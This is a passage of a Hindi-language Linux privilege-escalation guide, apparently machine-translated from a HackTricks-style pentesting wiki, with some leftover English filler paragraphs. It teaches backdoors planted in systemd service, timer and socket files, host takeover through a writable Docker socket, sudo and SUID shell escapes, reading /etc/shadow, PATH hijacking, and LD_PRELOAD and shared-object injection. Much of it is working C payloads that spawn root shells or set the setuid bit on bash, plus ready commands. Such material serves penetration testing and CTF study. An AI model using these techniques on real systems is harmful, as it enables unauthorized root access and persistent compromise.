जांचें कि क्या आप किसी भी `.service` फ़ाइल को लिख सकते हैं, यदि हां, तो आप इसे **संशोधित कर सकते हैं** ताकि जब सेवा **शुरू**, **पुनरारंभ** या **रोकी** जाती है, तो आपका **बैकडोर निष्पादित हो** (शायद आपको मशीन के पुनरारंभ होने तक प्रतीक्षा करनी पड़ेगी)।
उदाहरण के लिए, अपने बैकडोर को .service फ़ाइल के अंदर बनाएं और **`ExecStart=/tmp/script.sh`** के साथ।

### लिखने योग्य सेवा बाइनरी

ध्यान दें कि यदि आपके पास सेवाओं द्वारा निष्पादित बाइनरी पर **लिखने की अनुमति** है, तो आप उन्हें बैकडोर के लिए बदल सकते हैं, ताकि सेवाएं पुनः निष्पादित होने पर बैकडोर निष्पादित हों।

### systemd PATH - सापेक्ष मार्ग

आप **systemd** द्वारा उपयोग किए जाने वाले PATH को देख सकते हैं:
```bash
systemctl show-environment
```
यदि आपको पाठ में से किसी भी फ़ोल्डर में **लिख सकते हैं** तो आपको **विशेषाधिकार** को बढ़ा सकते हैं। आपको खोज करनी होगी **सेवा कॉन्फ़िगरेशन** फ़ाइलों में उपयोग होने वाले **संबंधित पथों** के लिए।
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
तो, एक **निष्पादनयोग्य** बनाएँ जिसका **नाम समान होता है जैसा कि सिस्टमडी पाथ फ़ोल्डर में बाइनरी है** और जब सेवा को विकल्पी कार्रवाई (**शुरू**, **रोकें**, **रीलोड**) करने के लिए कहा जाता है, तो आपका **बैकडोर निष्पादित होगा** (अनधिकृत उपयोगकर्ता आमतौर पर सेवाएं शुरू/रोकने में सक्षम नहीं हो सकते हैं लेकिन यह जांचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं।)

**`man systemd.service` के साथ सेवाओं के बारे में और अधिक जानें।**

## **टाइमर्स**

**टाइमर्स** सिस्टमडी यूनिट फ़ाइलें हैं जिनका नाम `**.timer**` से समाप्त होता है जो `**.service**` फ़ाइलें या इवेंट्स को नियंत्रित करती हैं। **टाइमर्स** क्रॉन के विकल्प के रूप में उपयोग किए जा सकते हैं क्योंकि इनमें कैलेंडर समय इवेंट्स और मोनोटोनिक समय इवेंट्स के लिए सहायक समर्थन होता है और इन्हें असिंक्रोनस रूप से चलाया जा सकता है।

आप सभी टाइमर्स की गणना कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप एक टाइमर को संशोधित कर सकते हैं, तो आप इसे कुछ systemd.unit के माध्यम से कार्यान्वित कर सकते हैं (जैसे `.service` या `.target`)।
```bash
Unit=backdoor.service
```
दस्तावेज़ीकरण में आप पढ़ सकते हैं कि इकाई क्या है:

> टाइमर के समय समाप्त होने पर सक्रिय करने के लिए इकाई। यह तार्किक एक इकाई नाम है, जिसका संकेतक ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो इस मान की डिफ़ॉल्ट मूल्य एक सेवा होता है जिसका नाम टाइमर इकाई के नाम के समान होता है, संकेतक को छोड़कर। (ऊपर देखें) सिफ़्फ़ा के अलावा, सलाह दी जाती है कि सक्रिय किए जाने वाले इकाई का नाम और टाइमर इकाई का इकाई नाम एक ही हो, संकेतक को छोड़कर।

इसलिए, इस अनुमति का दुरुपयोग करने के लिए आपको चाहिए होगा:

* किसी सिस्टमड इकाई (जैसे `.service`) का पता लगाएं जो **एक लिखने योग्य बाइनरी को निष्पादित कर रहा है**
* किसी सिस्टमड इकाई का पता लगाएं जो **एक संबंधित पथ को निष्पादित कर रहा है** और आपके पास **सिस्टमड पाथ** पर **लिखने योग्य अधिकार** है (उस निष्पादन को अनुकरण करने के लिए)

**टाइमर के बारे में और अधिक जानें `man systemd.timer` के साथ।**

### **टाइमर सक्षम करना**

टाइमर को सक्षम करने के लिए आपको रूट अधिकार चाहिए और निष्पादित करने के लिए निम्नलिखित को कार्यान्वित करना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
नोट करें कि **टाइमर** को **सक्रिय** करने के लिए `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर इसका symlink बनाना होगा।

## सॉकेट्स

संक्षेप में, एक Unix सॉकेट (तकनीकी रूप से, सही नाम Unix डोमेन सॉकेट, **UDS**) एक मशीन पर या अलग-अलग मशीनों पर क्लाइंट-सर्वर एप्लिकेशन फ्रेमवर्क में दो अलग प्रक्रियाओं के बीच **संचार करने की अनुमति** देता है। और अधिक सटीकता से कहें तो, यह एक मानक Unix डिस्क्रिप्टर फ़ाइल का उपयोग करके कंप्यूटरों के बीच संचार करने का एक तरीका है। (यहां से [पढ़ें](https://www.linux.com/news/what-socket/))।

सॉकेट्स `.socket` फ़ाइलों का उपयोग करके कॉन्फ़िगर किए जा सकते हैं।

**`man systemd.socket` के साथ सॉकेट्स के बारे में और अधिक जानें।** इस फ़ाइल में, कई दिलचस्प पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं लेकिन सारांश में इसका उपयोग किया जाता है **इसका संकेत देने के लिए कि यह कहां सुनेगा** (AF\_UNIX सॉकेट फ़ाइल का पथ, सुनने के लिए IPv4/6 और/या पोर्ट नंबर, आदि)
* `Accept`: एक बूलियन तर्क लेता है। यदि **सत्य**, तो प्रत्येक आउटगोइंग कनेक्शन के लिए एक **सेवा इंस्टेंस उत्पन्न होता है** और केवल कनेक्शन सॉकेट उसे पास किया जाता है। यदि **झूठा**, तो सभी सुनने वाले सॉकेट खुद को **शुरू किए गए सेवा यूनिट को पास किया जाता है**, और सभी कनेक्शनों के लिए केवल एक सेवा यूनिट उत्पन्न होता है। यह मान डेटाग्राम सॉकेट्स और FIFOs के लिए नगण्य है जहां एकल सेवा यूनिट अनवरोधित रूप से सभी आउटगोइंग ट्रैफ़िक को हैंडल करता है। **डिफ़ॉल्ट रूप में झूठा**। प्रदर्शन कारणों के लिए, नए डेमन को केवल `Accept=no` के लिए उपयुक्त तरीके में लिखने की सलाह दी जाती है।
* `ExecStartPre`, `ExecStartPost`: एक या एक से अधिक कमांड लाइन लेता है, जो सुनने वाले **सॉकेट्स**/FIFOs को **बनाए और बाइंड करने से पहले** या **बाद में** निष्पादित होते हैं। कमांड लाइन का पहला टोकन एक सशर्त फ़ाइल का नाम होना चाहिए, फिर प्रक्रिया के लिए तार्कों के बाद अनुसरण किए जाते हैं।
* `ExecStopPre`, `ExecStopPost`: और भी **कमांड** जो सुनने वाले **सॉकेट्स**/FIFOs को **बंद करने और हटाने से पहले** या **बाद में** निष्पादित होते हैं।
* `Service`: आउटगोइंग ट्रैफ़िक पर सक्रिय करने के लिए **सेवा** यूनिट नाम **निर्दिष्ट** करता है। यह सेटिंग केवल Accept=no वाले सॉकेट्स के लिए अनुमति दी जाती है। यह सॉकेट के नाम के साथ समान नाम वाली सेवा को डिफ़ॉल्ट रूप में लेता है (सफ़िक्स को बदलकर)। अधिकांश मामलों में, इस विकल्प का उपयोग करने की आवश्यकता नहीं होनी चाहिए।

### लिखने योग्य .socket फ़ाइलें

यदि आपको एक **लिखने योग्य** `.socket` फ़ाइल मिलती है, तो आप `[Socket]` खंड की शुरुआत में कुछ इस तरह जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और सॉकेट बनाए जाने से पहले बैकडोर निष्पादित हो जाएगा। इसलिए, आपको **संभवतः मशीन के पुनरारंभ होने तक प्रतीक्षा करनी पड़ेगी**।\
_ध्यान दें कि सिस्टम को उस सॉकेट फ़ाइल कॉन्फ़िगरेशन का उपयोग करना चाहिए या तो बैकडोर निष्पादित नहीं होगा_

### लिखने योग्य सॉकेट्स

यदि आप **लिखने योग्य सॉकेट** का पता लगाते हैं (_अब हम Unix सॉकेट की बात कर रहे हैं और `.socket` कॉन्फ़िग फ़ाइलों की बात नहीं कर रहे हैं_), तो आप उस सॉकेट के साथ **संवाद कर सकते हैं** और शायद एक संकट का उपयोग कर सकते हैं।

### Unix सॉकेट्स की जाँच करें
```bash
netstat -a -p --unix
```
### कच्ची कनेक्शन

To establish a raw connection, you can use tools like `netcat` or `nc` to connect to a specific IP address and port. This allows you to communicate directly with the target system without any protocol or encryption.

To connect to a remote system using `netcat`, use the following command:

```
nc <IP address> <port>
```

Replace `<IP address>` with the target system's IP address and `<port>` with the desired port number.

Once the connection is established, you can send and receive data through the terminal. This can be useful for various purposes, including debugging network issues, testing network services, or even exploiting vulnerabilities.

Keep in mind that raw connections do not provide any security or authentication mechanisms. Therefore, it is important to use them responsibly and only on systems that you have permission to access.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**उदाहरण का शोषण:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP सॉकेट्स

ध्यान दें कि कुछ **HTTP अनुरोधों के लिए सॉकेट्स सुन रहे हो सकते हैं** (_मैं .socket फ़ाइलों की बात नहीं कर रहा हूँ, बल्कि यूनिक्स सॉकेट के रूप में कार्य करने वाली फ़ाइलें_). आप इसे निम्नलिखित के साथ जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि सॉकेट **एक HTTP** अनुरोध के साथ प्रतिक्रिया करता है, तो आप उसके साथ **संवाद कर सकते** हैं और शायद कुछ संकट का उपयोग कर सकते हैं।

### लिखने योग्य डॉकर सॉकेट

**डॉकर सॉकेट** आमतौर पर `/var/run/docker.sock` पर स्थित होता है और केवल `root` उपयोगकर्ता और `docker` समूह द्वारा लिखने योग्य होता है।
यदि किसी कारणवश **आपके पास उस सॉकेट पर लिखने की अनुमति है**, तो आप विशेषाधिकार को बढ़ा सकते हैं।
इसके लिए निम्नलिखित आदेशों का उपयोग किया जा सकता है:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### डॉकर वेब API का उपयोग डॉकर पैकेज के बिना सॉकेट से करें

यदि आपके पास **डॉकर सॉकेट** तक पहुंच है लेकिन आप डॉकर बाइनरी का उपयोग नहीं कर सकते हैं (शायद यह स्थापित भी नहीं है), तो आप `curl` के साथ सीधे वेब API का उपयोग कर सकते हैं।

निम्नलिखित कमांड एक उदाहरण हैं कि कैसे **डॉकर कंटेनर बनाएं जो होस्ट सिस्टम के रूट को माउंट करता है** और नए डॉकर में कमांड को निष्पादित करने के लिए `socat` का उपयोग करें।
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
अंतिम कदम है `socat` का उपयोग करके कंटेनर के साथ एक कनेक्शन आरंभ करना, "अटैच" अनुरोध भेजना।
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
अब, आप इस `socat` कनेक्शन से कंटेनर पर कमांड्स चला सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास डॉकर सॉकेट पर लिखने की अनुमति है क्योंकि आप **`docker` समूह के अंदर हैं**, तो आपके पास [**अधिक तरीके हैं जिससे विशेषाधिकारों को उन्नत किया जा सकता है**](interesting-groups-linux-pe/#docker-group)। यदि [**डॉकर API किसी पोर्ट पर सुन रहा है तो आप इसे भी कंप्रोमाइज कर सकते हैं**](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

जांचें **डॉकर से बाहर निकलने या इसे उन्नत करने के और तरीके**:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) विशेषाधिकार उन्नत करना

यदि आपको लगता है कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ को पढ़ें क्योंकि **आप इसे उन्नत करने के लिए इसका दुरुपयोग कर सकते हैं**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** विशेषाधिकार उन्नत करना

यदि आपको लगता है कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ को पढ़ें क्योंकि **आप इसे उन्नत करने के लिए इसका दुरुपयोग कर सकते हैं**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-BUS एक **इंटर-प्रोसेस संचार (IPC) सिस्टम** है, जो एक सरल और शक्तिशाली तंत्र प्रदान करता है **जिसके द्वारा एक्सेस करने की अनुमति होती है**, सूचना संचार करने और सेवाएं अनुरोधित करने की। D-BUS को एक पूर्ण विशेषताओं वाला IPC और ऑब्जेक्ट सिस्टम के रूप में उपयोग किया जा सकता है। पहले, D-BUS मूल रूप से एक्सेस करने की अनुमति देता है, जिसके द्वारा एक प्रक्रिया दूसरे प्रक्रिया को डेटा भेज सकती है - यहां **UNIX डोमेन सॉकेट्स को तेजी से बढ़ावा देने की तरह** सोचें। दूसरा, D-BUS प्रणाली के माध्यम से प्रणाली में घटनाएं, या सिग्नल, भेजने में सहायता कर सकता है, जिससे प्रणाली में विभिन्न घटक संवाद कर सकते हैं और अंततः बेहतर एकीकरण कर सकते हैं। उदाहरण के लिए, एक ब्लूटूथ डीमॉन आपके संगीत प्लेयर को इंटरसेप्ट करके आपको आवाज को म्यूट करने तक आने वाले इनकमिंग कॉल सिग्नल भेज सकता है। अंत में, D-BUS एक दूरस्थ ऑब्जेक्ट सिस्टम को लागू करता है, जिससे एक अनुप्रयोग सेवाएं अनुरोधित कर सकता है और एक अलग ऑब्जेक्ट से विधि को आमंत्रित कर सकता है - यहां संघटना के बिना CORBA की तरह सोचें। (यहां से [यहां](https://www.linuxjournal.com/article/7744)।)

D-Bus एक **अनुमति/अस्वीकृति मॉडल** का उपयोग करता है, जहां प्रत्येक संदेश (मेथड कॉल, सिग्नल उत्पादन, आदि) को उससे मेल खाने वाले सभी नीति नियमों के अनुसार **अनुमति दी जा सकती है या अस्वीकार की जा सकती है**। नीति में हर नियम को `own`, `send_destination` या `receive_sender` विशेषता सेट करनी चाहिए।

`/etc/dbus-1/system.d/wpa_supplicant.conf` की नीति का हिस्सा:
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
इसलिए, यदि कोई नीति आपको किसी भी तरीके से **बस के साथ संवाद करने की अनुमति दे रही है**, तो आप इसे उच्चाधिकार तक बढ़ाने के लिए उपयोग कर सकते हैं (शायद कुछ पासवर्डों के लिए सिर्फ सूचीबद्ध करना हो?).

ध्यान दें कि **नीति** जो किसी उपयोगकर्ता या समूह को निर्दिष्ट नहीं करती है, वह सभी को प्रभावित करती है (`<नीति>`).\
"डिफ़ॉल्ट" संदर्भ के लिए नीतियाँ उन सभी को प्रभावित करती हैं जिन्हें अन्य नीतियों द्वारा प्रभावित नहीं किया गया है (`<नीति संदर्भ="डिफ़ॉल्ट"`).

**यहां डी-बस संचार को जांचने और उपयोग करने का तरीका सीखें:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **नेटवर्क**

मशीन की स्थिति का जांच करने और नेटवर्क को विस्तार से जानने के लिए हमेशा रुचिकर होता है.

### सामान्य जांच
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### खुले पोर्ट्स

हमेशा यह सुनिश्चित करें कि आप उस मशीन पर पहुंचने से पहले जिन सेवाओं को चलाया जा रहा है, उन्हें जांचें जिनसे आप पहले इंटरैक्ट करने में सक्षम नहीं थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### स्निफिंग

जांचें कि क्या आप ट्रैफिक स्निफ कर सकते हैं। यदि आप कर सकते हैं, तो आप कुछ क्रेडेंशियल प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## उपयोगकर्ता

### सामान्य जांच

जांचें कि आप कौन हैं, आपके पास कौन से **विशेषाधिकार** हैं, सिस्टम में कौन से **उपयोगकर्ता** हैं, कौन से **लॉगिन** कर सकते हैं और कौन से **रूट विशेषाधिकार** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा यूआईडी

कुछ लिनक्स संस्करणों को एक बग से प्रभावित किया गया था जो **UID > INT\_MAX** वाले उपयोगकर्ताओं को विशेषाधिकार बढ़ाने की अनुमति देता है। अधिक जानकारी: [यहां](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [यहां](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [यहां](https://twitter.com/paragonsec/status/1071152249529884674)।\
**इसे उपयोग करके उत्पन्न करें**: **`systemd-run -t /bin/bash`**

### समूह

जांचें कि क्या आपके पास रूट विशेषाधिकार प्रदान कर सकने वाले किसी समूह का सदस्यता है:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### क्लिपबोर्ड

जांचें कि क्या क्लिपबोर्ड में कोई रुचिकर वस्तु स्थित है (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति

A strong password policy is essential for maintaining the security of a system. It helps prevent unauthorized access and protects sensitive information. Here are some key points to consider when implementing a password policy:

- **Password Complexity**: Passwords should be complex and difficult to guess. They should include a combination of uppercase and lowercase letters, numbers, and special characters.

- **Password Length**: Passwords should be of sufficient length to make them harder to crack. A minimum length of 8 characters is recommended, but longer passwords are even better.

- **Password Expiration**: Regularly changing passwords is a good practice. Passwords should expire after a certain period, such as every 90 days, to ensure that compromised passwords are not used for an extended period.

- **Password History**: Users should not be allowed to reuse their previous passwords. Implement a password history policy that prevents the reuse of passwords for a certain number of iterations.

- **Account Lockout**: Implement an account lockout policy that locks user accounts after a certain number of failed login attempts. This helps prevent brute-force attacks.

- **Password Storage**: Passwords should be securely stored using strong encryption algorithms. Avoid storing passwords in plain text or weakly encrypted formats.

By implementing a strong password policy, you can significantly enhance the security of your system and protect it from unauthorized access.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आपके पास पर्याप्त जानकारी है कि किसी उपयोगकर्ता का पासवर्ड क्या है, तो प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने का प्रयास करें।

### Su Brute

यदि आपको शोर करने की चिंता नहीं है और कंप्यूटर पर `su` और `timeout` बाइनरी मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता को ब्रूट-फोर्स करने का प्रयास कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) को `-a` पैरामीटर के साथ भी उपयोगकर्ताओं को ब्रूट-फोर्स करने का प्रयास करें।

## लिखने योग्य PATH का दुरुपयोग

### $PATH

यदि आपको पाया जाता है कि आप **$PATH** के किसी फ़ोल्डर में लिख सकते हैं, तो आप लिखने योग्य फ़ोल्डर के अंदर एक बैकडोर बनाकर वर्चस्व को बढ़ा सकते हैं। इस बैकडोर का नाम किसी ऐसे कमांड का होना चाहिए जो किसी अलग उपयोगकर्ता (आदर्श रूप से रूट) द्वारा निष्पादित किया जाएगा और जो आपके लिखने योग्य फ़ोल्डर से पहले स्थित नहीं है।

### SUDO और SUID

आपको सुदो का उपयोग करके कुछ कमांड को निष्पादित करने की अनुमति मिल सकती है या उनके पास सुइड बिट हो सकती है। इसे जांचने के लिए निम्न का उपयोग करें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अप्रत्याशित कमांड आपको फ़ाइलों को पढ़ने और/या लिखने या तो कमांड को चलाने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

सुडो कॉन्फ़िगरेशन एक उपयोगकर्ता को पासवर्ड नहीं जानते हुए किसी अन्य उपयोगकर्ता की विशेषाधिकारों के साथ कुछ कमांड को निष्पादित करने की अनुमति दे सकती है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है, अब रूट निर्देशिका में एक SSH की को जोड़कर या `sh` को कॉल करके शेल प्राप्त करना बहुत आसान हो गया है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देशिका उपयोगकर्ता को कुछ करते समय **एक पर्यावरण चर** सेट करने की अनुमति देती है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, HTB मशीन Admirer पर आधारित है, जिसमें PYTHONPATH हाइजैकिंग के लिए संक्षेप में विकल्पित पायथन पुस्तकालय लोड करने के लिए स्क्रिप्ट को रूट के रूप में निष्पादित करते समय कमजोरी थी:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo पथों को छोड़कर निष्पादन करना

**अन्य फ़ाइलें पढ़ने** के लिए या **सिमलिंक** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि **वाइल्डकार्ड** का उपयोग किया जाता है (\*), तो यह और भी आसान हो जाता है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**विरोधात्मक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo कमांड/SUID बाइनरी बिना कमांड पथ के

यदि **sudo अनुमति** केवल एक कमांड को **पथ निर्दिष्ट किए बिना** दी जाती है: _hacker10 ALL= (root) less_ तो आप पाठ को बदलकर इसका शोध कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक उपयोग की जा सकती है यदि एक **suid** बाइनरी **पथ को निर्दिष्ट किए बिना एक अन्य कमांड को निष्पादित करती है (हमेशा एक अजीब SUID बाइनरी की सामग्री के साथ** _**strings**_ **के साथ जांचें)**।

[निष्पादित करने के लिए उदाहरण पेलोड।](payloads-to-execute.md)

### पथ के साथ SUID बाइनरी

यदि **suid** बाइनरी **पथ को निर्दिष्ट करके एक अन्य कमांड को निष्पादित करती है**, तो आपको कोशिश करनी चाहिए कि एक फंक्शन बनाएं और उसे निर्यात करें जिसका नाम सुईद फ़ाइल को बुलाया जा रहा है।

उदाहरण के लिए, यदि एक suid बाइनरी _**/usr/sbin/service apache2 start**_ को बुलाती है, तो आपको फ़ंक्शन बनाने और निर्यात करने की कोशिश करनी होगी:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid बाइनरी को कॉल करते हैं, यह फ़ंक्शन चलाया जाएगा

### LD\_PRELOAD और **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** एक ऐसा वैकल्पिक पर्यावरणीय चर है जिसमें एक या एक से अधिक साझा पुस्तकालयों, या साझा ऑब्जेक्ट्स, के पथ होते हैं, जिन्हें लोडर लोड करेगा, इसमें सी रनटाइम पुस्तकालय (libc.so) सहित किसी भी अन्य साझा पुस्तकालय से पहले। इसे एक पुस्तकालय को प्रीलोड करना कहा जाता है।

यदि _ruid != euid_ हो तो लोडर _LD\_PRELOAD_ को अनदेखा करता है ताकि इसे _suid/sgid_ निष्पादनीय बाइनरीज़ के लिए हमला वेक्टर के रूप में उपयोग नहीं किया जा सके। इस तरह की बाइनरीज़ के लिए, केवल मानक पथ में पुस्तकालयों को प्रीलोड किया जाएगा जो भी _suid/sgid_ हों।

यदि आप **`sudo -l`** के आउटपुट में इस वाक्यांश को पाते हैं: _**env\_keep+=LD\_PRELOAD**_ और आप कुछ कमांड sudo के साथ कॉल कर सकते हैं, तो आप विशेषाधिकार बढ़ा सकते हैं।
```
Defaults        env_keep += LD_PRELOAD
```
सहेजें जैसे **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर इसे **कंपाइल** करें:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **वृद्धि अधिकार** चलाएं
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
एक समान प्राइवेसीकरण का दुरुपयोग किया जा सकता है अगर हमलावर **LD\_LIBRARY\_PATH** env चर को नियंत्रित करता है क्योंकि उसे पथ नियंत्रित करता है जहां पुस्तकालयों की खोज की जाएगी।
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID बाइनरी - .so इंजेक्शन

यदि आपको कुछ अजीब बाइनरी मिलती है जिसमें **SUID** अनुमतियाँ होती हैं, तो आप यह जांच सकते हैं कि क्या सभी **.so** फ़ाइलें **सही ढंग से लोड** हो रही हैं। इसके लिए आप निम्नलिखित को निष्पादित कर सकते हैं:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, यदि आपको ऐसा कुछ मिलता है: _pen("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (ऐसी कोई फ़ाइल या निर्देशिका नहीं)_ तो आप इसे शोषण कर सकते हैं।

कोड के साथ फ़ाइल _/home/user/.config/libcalc.c_ बनाएं:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
इसे निम्नलिखित का उपयोग करके कंपाइल करें:
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
और बाइनरी को निष्पादित करें।

## साझा ऑब्जेक्ट हाइजैकिंग
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
